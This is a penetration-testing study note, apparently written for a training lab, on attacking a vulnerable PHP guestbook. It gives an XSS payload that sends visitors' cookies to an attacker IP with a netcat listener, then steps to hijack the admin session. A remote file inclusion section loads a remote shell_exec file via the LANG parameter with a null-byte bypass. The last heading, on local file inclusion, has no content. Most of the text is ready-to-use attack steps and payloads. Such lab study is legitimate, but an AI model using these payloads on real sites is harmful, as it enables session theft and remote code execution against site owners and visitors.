#Webapps

##Getting Started
1. Start XAMPP and apache/mysql

2. Navigate to the host in your webbrowser (should be a guestbook application)

## XSS
The sign in page isn't filtered and so you can submit javascript which will run when someone views your comment

In this case I posted `<script>alert("XSS");</script>` which when viewed simply pops up the message "XSS"

XSS can be leveraged to do many things but as an example...

1. Create a comment with an iframe pointing to your ip `<iframe src="http://yo.ur.ip.addr:81/report" width="0" height="0"></iframe>`

2. Setup a listener on your machine `nc -lvp 81` 

3. visit the site from a victims machine and you will see a connection, you can use this to exploit the browser, gather information or grab cookies

**Grabbing Cookies**

1. Submit a comment with the following JS `<script> new Image().src="http://10.11.0.74:81/bogus.php"+document.cookie; </script>`

2. Setup a listener on your machine `nc -lvp 81` 

3. Visit the page as an admin

3. You will see that the cookie has been appended to the url your listener picks up

4. We can steal this cookie and login as the user, edit cookies using your browsers console `document.cookie = "PHPSESSID=34015asdsad08f566d00635a6e8ae98"`

## Remote File Inclusions
1. Whilst testing the website we notice that the language dropdown on the signin page appears to grab data from a file

2. We can see this on examining the source code

   ```
   if (isset( $_GET['LANG'] )) { 
     $lang = $_GET['LANG'];
   } else { 
     $lang = 'en';
   }
   include( $lang . '.php' );
   ```

3. We can see the parameters in the URL so tweaking the lang param to our own file is trivial

   `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&LANG=fr&Submit=Submit`
   `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&LANG=http://10.11.0.74/evil.txt&Submit=Submit`

4. Create our evil file `echo '<?php echo shell_exec("ipconfig"); ?>' >> /var/www/evil.txt`

5. Start apache `service apache2 start`

6. When we navigate to the site we can see that the script appended `.php` onto the end of our request

7. We can get around this by using a null byte (which works in php <=5.3) and causes php to ignore everything after it

   `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&LANG=http://10.11.0.74/evil.txt%00&Submit=Submit`

8. Navigate again to the site and we get the output of the ipconfig command


**Notes**
Might be turned off in php.ini file look for `allow_url_fopen` and `allow_url_include`

##Local File Inclusion
